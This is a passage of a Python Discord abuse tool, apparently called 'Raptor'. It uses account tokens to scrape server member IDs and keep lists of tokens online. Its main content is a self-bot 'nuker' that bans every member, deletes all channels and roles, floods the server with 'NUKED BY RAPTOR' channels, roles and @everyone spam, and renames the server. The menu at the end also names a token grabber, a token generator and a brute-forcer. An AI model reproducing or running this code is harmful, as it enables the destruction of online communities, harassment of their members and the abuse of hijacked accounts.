                print(' Done!')
            else:
                print(r)

        elif abtoptions in ['02','2']:
            t = requests.patch(url, headers=header,json=payload2)
            if t.status_code == 200 or 204:
                print(' Done!')
            else:
                print(t)

        elif abtoptions in ['03','3']:
            e = requests.patch(url, headers=header,json=payload3)
            if e.status_code == 200 or 204:
                print(' Done!')
            else:
                print(e)

        else:
          pass  

  def scraper():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Member ID Scraper")
    print(f'''
{Fore.MAGENTA}  __  __                _                 ____                                 
 |  \/  | ___ _ __ ___ | |__   ___ _ __  / ___|  ___ _ __ __ _ _ __   ___ _ __ 
 | |\/| |/ _ \ '_ ` _ \| '_ \ / _ \ '__| \___ \ / __| '__/ _` | '_ \ / _ \ '__|
{Fore.RED} | |  | |  __/ | | | | | |_) |  __/ |     ___) | (__| | | (_| | |_) |  __/ |   
 |_|  |_|\___|_| |_| |_|_.__/ \___|_|    |____/ \___|_|  \__,_| .__/ \___|_|   
                                                              |_|              
    ''')
    tukan = input('What is the token you want to use to scrape?: ')
    guildd = input('What is the Server ID you want to scrape?: ')
    chann = input('Any channel id in the server: ')
    bot = discum.Client(token=tukan)

    def closefetching(resp,guildid):
        if bot.gateway.finishedMemberFetching(guildid):
            lenmembersfetched = len(bot.gateway.session.guild(guildid).members)
            print(str(lenmembersfetched))
            bot.gateway.removeCommand({'function':closefetching, 'params':{'guildid':guildid}})
            bot.gateway.close()

    def getmembers(guildid,channelid):
        bot.gateway.fetchMembers(guildid, channelid, keep='all',wait=1)
        bot.gateway.command({'function':closefetching,'params':{'guildid':guildid}})
        bot.gateway.run()
        bot.gateway.resetSession()
        return bot.gateway.session.guild(guildid).members

    members = getmembers(guildd, chann)

    memberids = []

    for memberId in members:
        memberids.append(memberId)

    cls()

    with open('Member_id.txt','w') as ids:
        for element in memberids:
            ids.write(element + '\n')    

    print(f'Finished Scraping {len(memberids)} members ! Check Member_id.txt for the ids')
  
  def namegen():
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Name Generator")
      print(f'''
      {Fore.MAGENTA} _   _                         ____            
      | \ | | __ _ _ __ ___   ___   / ___| ___ _ __  
      |  \| |/ _` | '_ ` _ \ / _ \ | |  _ / _ \ '_ \ 
      {Fore.RED}| |\  | (_| | | | | | |  __/ | |_| |  __/ | | |
      |_| \_|\__,_|_| |_| |_|\___|  \____|\___|_| |_|                                               
      ''')

      howmanynames = int(input('How many names do you want? (less than 200): '))

      if howmanynames > 200:
          print('Maximum amount of names is 200!')
          return

      num1 = howmanynames / 2

      payload = {
          'count':num1
      }

      def getnames(urll):
          r = requests.get(urll, json=payload)

          data = r.json()['data']

          names = []

          for value in data:
              names.append(value['name'])

          with open('names.txt','a') as name:
              for line in names:
                  name.write(line + '\n')

      getnames(f'https://story-shack-cdn-v2.glitch.me/generators/username-generator?count={num1}')
      getnames(f'https://story-shack-cdn-v2.glitch.me/generators/gamertag-generator?count={num1}')

      print('Done! Added {} names to names.txt'.format(howmanynames))

  def nuker():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Server Nuker")
    print(f'''
{Fore.MAGENTA}  _   _       _             
 | \ | |_   _| | _____ _ __ 
 |  \| | | | | |/ / _ \ '__|
{Fore.RED} | |\  | |_| |   <  __/ |   
 |_| \_|\__,_|_|\_\___|_|                             
    ''')
    token = input(' Account Token: ')
    server = input(f' Server ID: ')
    chann = input(' Any Channel ID: ')


    intents = discord.Intents.all()
    intents.members = True

    headerrs = {'Authorization': f'{token}',
                "accept": "*/*",
                'origin': 'https://discord.com',
                'sec - fetch - mode': 'cors',
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                'sec - fetch - site': 'same - origin',
                'x - debug - options': 'bugReporterEnabled',
                'x - super - properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAyMTEzLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ =='
                }
    client = commands.Bot(command_prefix="!", case_insensitive=False, self_bot=True, intents=intents)

    def BanAll():
        with open('nuking/Member_id.txt') as memberss:
            for line in memberss:
                r = requests.put(f'https://discord.com/api/v9/guilds/{server}/bans/{line}', headers=headerrs)
                if r.status_code == 200 or 204:
                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Banned {line} ")
                else:
                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant ban members') 
    class UNuker:
        def DeleteChannels(self, guild, channel):
            while True:
                r = requests.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headerrs)
                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        print(
                            f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Deleted Channel {channel}")
                        break
                    else:
                        break

        def DeleteRoles(self, guild, role):
            while True:
                r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role}",
                                    headers=headerrs)
                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        print(
                            f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Deleted Role {role}")
                        break
                    else:
                        break

        async def Scrape(self):
            await client.wait_until_ready()
            guildOBJ = client.get_guild(int(server))

            channelcount = 0
            with open('nuking/channels.txt', 'w') as c:
                for channel in guildOBJ.channels:
                    c.write(str(channel.id) + "\n")
                    channelcount += 1
                c.close()

            bot = discum.Client(token=token)

            def closefetching(resp,guildid):
                if bot.gateway.finishedMemberFetching(guildid):
                    lenmembersfetched = len(bot.gateway.session.guild(guildid).members)
                    print(str(lenmembersfetched))
                    bot.gateway.removeCommand({'function':closefetching, 'params':{'guildid':guildid}})
                    bot.gateway.close()

            def getmembers(guildid,channelid):
                bot.gateway.fetchMembers(guildid, channelid, keep='all',wait=1)
                bot.gateway.command({'function':closefetching,'params':{'guildid':guildid}})
                bot.gateway.run()
                bot.gateway.resetSession()
                return bot.gateway.session.guild(guildid).members

            members = getmembers(server, chann)

            global memberids
            memberids = []

            for memberId in members:
                memberids.append(memberId)
            
            with open('nuking/Member_id.txt','w') as ids:
                for element in memberids:
                    ids.write(element + '\n')  

            rolecount = 0
            with open('nuking/roles.txt', 'w') as r:
                for role in guildOBJ.roles:
                    r.write(str(role.id) + "\n")
                    rolecount += 1
                r.close()


        def SpamChannels(self, guild, name):
            while True:
                json = {'name': name, 'type': 0}
                r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headerrs, json=json)

                id = r.json()["id"]

                def sendmessage():
                    e = requests.post(f'https://discord.com/api/v9/channels/{id}/messages',headers=headerrs, json={'content':'@everyone @here NUKED BY RAPTOR'})
                    if 'retry_after' in e.text:
                        ratelimittime = round(e.json()["retry_after"])
                        time.sleep(ratelimittime)

                sendmessage()

                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Created Channel ")
                        break
                    else:
                        print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant create channels')



        def SpamRoles(self, guild, name):
            while True:
                json = {'name': name}
                r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/roles', headers=headerrs,
                                    json=json)
                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Created Role ")
                        break
                    else:
                        print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant create roles')
                        break

        async def NukeStart(self):
            cls()
            chh = 'nuked-by-raptor'
            cha = input(f"Channel Amount: ")
            rn = 'NUKED BY RAPTOR'
            ra = input(f"Role Amount: ")

            print('CAUTION!, There is a high likely hood of your account being locked if you do not have phone verification!')
            time.sleep(5)
            os.system('pause')
            BanAll()

            url = f'https://discord.com/api/v9/guilds/{server}'

            image = "data:image/jpeg;base64,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"

            e = requests.patch(url, headers=headerrs, json={'name':"Nuked By Raptor", 'icon':image})

            channels = open('nuking/channels.txt')
            roles = open('nuking/roles.txt')

            for channel in channels:
                threading.Thread(target=self.DeleteChannels, args=(server, channel,)).start()
            for role in roles:
                threading.Thread(target=self.DeleteRoles, args=(server, role,)).start()
            for i in range(int(cha)):
                threading.Thread(target=self.SpamChannels, args=(server, chh,)).start()
            for i in range(int(ra)):
                threading.Thread(target=self.SpamRoles, args=(server, rn,)).start()

        async def Menu(self):
            await self.Scrape()
            time.sleep(2)
            await self.NukeStart()
            time.sleep(2)
            await self.Menu()

        @client.event
        async def on_ready(*Args):
            await UNuker().Menu()

        def Check(self):
            client.run(token, bot=False)

    if __name__ == "__main__":
        UNuker().Check()

  def onliner():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Token Onliner")
    options5 = input(f'''
    {Fore.MAGENTA}  ___        _ _                 
     / _ \ _ __ | (_)_ __   ___ _ __ 
    | | | | '_ \| | | '_ \ / _ \ '__|
    {Fore.RED}| |_| | | | | | | | | |  __/ |   
     \___/|_| |_|_|_|_| |_|\___|_|   
                                 
    {Fore.LIGHTBLUE_EX}
    [01] ONLINER
    [02] GAME ACTIVITY
    [03] RAPTOR ONLINER 

    [\>]''')

    if options5 in ['01','1']:
        def onliner1():
            with open('tokens.txt','r') as tokens:
                for line in tokens:
                    ws = websocket.WebSocket()

                    ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')

                    auth = {'op': 2,
                            'd': {'token': line,
                                    'properties': {'$os': sys.platform,
                                                    '$browser': 'RTB',
                                                    '$device': f"{sys.platform} Device"},
                                    'presence': {'game': None,
                                                'status': 'Online',
                                                'since': 0,
                                                'afk': False}},
                            's': None,
                            't': None}
                    ws.send(json.dumps(auth))

        while __name__ == '__main__':
            onliner1()

    elif options5 in ['02','2']:
        game = input(' What do you want the game status for the tokens to be?: ')
        def onliner2():
            with open('tokens.txt','r') as tokens:
                for line in tokens:
                    ws = websocket.WebSocket()
                    ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
                    gjs = {'name': game,
                        'type': 0}
                    auth = {'op': 2,
                            'd': {'token': line,
                                'properties': {'$os': sys.platform,
                                                '$browser': 'RTB',
                                                '$device': f"{sys.platform} Device"},
                                'presence': {'game': gjs,
                                            'status': 'Online',
                                            'since': 0,
                                            'afk': False}},
                            's': None,
                            't': None}
                    ws.send(json.dumps(auth))

        while __name__ == '__main__':
            onliner2()
        

    elif options5 in ['03','3']:
        game = 'Raptor On Top <3'
        def onliner3():
            with open('tokens.txt','r') as tokens:
                for line in tokens:
                    ws = websocket.WebSocket()
                    ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
                    gjs = {'name': game,
                        'type': 0}
                    auth = {'op': 2,
                            'd': {'token': line,
                                'properties': {'$os': sys.platform,
                                                '$browser': 'RTB',
                                                '$device': f"{sys.platform} Device"},
                                'presence': {'game': gjs,
                                            'status': 'Online',
                                            'since': 0,
                                            'afk': False}},
                            's': None,
                            't': None}
                    ws.send(json.dumps(auth))

        while __name__ == '__main__':
            onliner3()

  def leaver():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Server Leaver")
    print(f'''
{Fore.MAGENTA}  _                              
 | |    ___  __ ___   _____ _ __ 
 | |   / _ \/ _` \ \ / / _ \ '__|
{Fore.RED} | |__|  __/ (_| |\ V /  __/ |   
 |_____\___|\__,_| \_/ \___|_|    
    ''')
    serverid = input('What is the server id you want to leave?: ')
    url = f'https://discord.com/api/v9/users/@me/guilds/{serverid}'

    tokens = []
    token = []

    with open('tokens.txt','r') as f:
        for line in f:
            tokens.append(line)

        for element in tokens:
            token.append(element.strip())

        length = len(token)

    for x in range(length):
        header = {
            "authority": "discord.com",
            "path": f"/api/v9/users/@me/settings",
            'method': 'PATCH',
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{token[x]}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": useragent(),
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        r = requests.delete(url, headers=header)
        if r.status_code == 200 or 204:
            print('Left Guild!')  



  if options in ['1','01']:
    joiner()
  elif options in ['2','02']:
    webhooks()
  elif options in ['3','03']:
    tokennuke()
  elif options in ['15']:
    bruteforce()
  elif options in ['16']:
    checker()
  elif options in ['6','06']:
    friends()
  elif options in ['05','5']:
    tokenspammer()
  elif options in ['9','09']:
    tokengen()
  elif options in ['10']:
    nitro()
  elif options in ['08','8']:
    leaver()
  elif options in ['07','7']:
      onliner()
  elif options in ['11']:
    proxyscrape()
  elif options in ['12']:
    grabber()
  elif options in ['13']:
    scraper()
  elif options in ['14']:
    namegen()
  elif options in ['15']:
    bruteforce()
  elif options in ['18']:
    biochanger()
  elif options in ['19']:
    hypesquad()
  elif options in ['20']:
    tokeninfo()
  elif options in ['21']:
    login()
  elif options in ['22']:
    exit()
  elif options in ['04','4']:
    nuker()
  elif options in ['17']:
    pfpmanager()
  elif options in ['24']:
    discordserver()
  elif options in ['5','05']:
    tokenspammer()
  elif options in ['23']:
    credits()
  elif options in ['25']:
    youtube()
  elif options in ['26']:
    github()
  elif options in ['27']:
    aboutthis()
  else:
    print("Invalid Option")


tool()
while __name__ == '__main__':
    print(Fore.BLUE)
    os.system('pause')
    tool()

